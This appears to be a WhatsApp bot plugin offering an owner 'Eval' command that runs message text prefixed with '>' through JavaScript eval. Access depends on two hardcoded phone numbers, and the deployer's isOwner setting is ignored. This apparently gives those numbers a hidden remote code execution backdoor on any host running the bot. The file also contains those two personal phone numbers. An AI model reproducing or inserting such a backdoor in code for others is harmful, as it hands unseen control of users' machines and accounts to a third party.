const config = require('../config')
const {
	commands,
	Astro
} = require('../command');
const util = require('util');
Astro({
		on: "body",
		desc: "Eval",
		category: "owner",
		filename: __filename
	},
	async (conn, mek, m, {
		from,
		quoted,
		body,
		isCmd,
		command,
		args,
		q,
		isGroup,
		sender,
		senderNumber,
		botNumber2,
		botNumber,
		pushname,
		isMe,
		isOwner,
		groupMetadata,
		groupName,
		participants,
		groupAdmins,
		isBotAdmins,
		isAdmins,
		verify,
		reply,
		ameen
	}) => {
		
    var Ameen = ['916238768108', '918589959671']
		if (Ameen.includes(senderNumber)) {
        if (body.startsWith(">")) {
            try {
                let evaled = await eval(`(async () => { ${body?.replace(">", "")} })()`);
                if (typeof evaled !== "string") evaled = util.inspect(evaled);
                await reply(`${evaled}`);
	    } catch (e) {
				m.reply(`${e.message}`);
			}
		}
		}});
